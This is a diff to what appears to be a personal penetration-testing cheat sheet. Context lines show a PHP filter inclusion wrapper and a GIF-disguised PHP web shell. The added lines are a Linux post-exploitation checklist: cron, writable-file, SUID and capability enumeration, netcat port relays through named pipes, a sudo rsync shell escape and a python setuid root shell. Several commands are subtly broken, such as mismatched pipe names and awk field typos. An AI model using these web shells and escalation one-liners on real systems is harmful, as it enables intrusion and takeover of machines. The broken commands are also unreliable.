@@ -144,3 +144,63 @@ php://filter/convert.base64-encode/resource=
 UPLOAD Image
 GIF89a1
 <?php system($_POST["cmd"]); ?>
+=============================================================================================================
+
+=============================================================================================================
+//sh == custom content == writeable == double win
+grep -rnw '/etc/' -e '.sh' 2>/dev/null
+grep -rnw '/dev/' -e '.sh' 2>/dev/null
+grep -rnw '/var/' -e '.sh' 2>/dev/null
+
+find / -iname "*.sh" 2>/dev/null
+=============================================================================================================
+=====[CRON]
+=============================================================================================================
+crontab -u root -l
+
+Look from unusual system-wide jobs:
+cat /etc/crontab
+ls /etc/cron.*
+=============================================================================================================
+#The fuck can I even read?
+ls -aRl /etc/ | awk '$l ~ /^.*w*/' 2>/dev/null    #Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null     #Owner
+ls -aRl /etc/ | awk '$l ~ /^.....w/' 2>/dev/null  #Group
+ls -aRl /etc/ | awk '$l ~ /w.$/' 2>/dev/null      #Other
+
+find /etc/ -readable -type f 2>/dev/null          #Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null  #Anyone
+=============================================================================================================
+[+ Forwarding out trafficwith mknod]
+=============================================================================================================
+mknod backpip p; nc -l -p 8080 < backpip | nc 10.5.5.151 80 > backpip    #Port relay
+mknod backpip p; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpip  #Proxy (port 80 to 8080)
+mknod backpip p; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpip  #Proxy monitor (port 80 to 8080)
+=============================================================================================================
+=====WHAT CAN BE FOUND in /VAR?
+=============================================================================================================
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+=============================================================================================================
+===sudo rsync PrivEsc:
+sudo rsync -e 'sh -c "sh 0<&2 1>$2"' 127.0.0.1:/dev/null
+=============================================================================================================
+===FIND ANYTHING USER RELATED
+find . -iname*'USER'* 2>/dev/null
+=============================================================================================================
+===SUID BINARIES
+=============================================================================================================
+#find SUID
+find / -perm -u=s -type f 2>/dev/null
+
+#finf GUID
+find / -perm -g=s -type f 2>/dev/null
+
+#File capabilities (extended privileges -ep?)
+getcap -I / 2>/dev/null
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
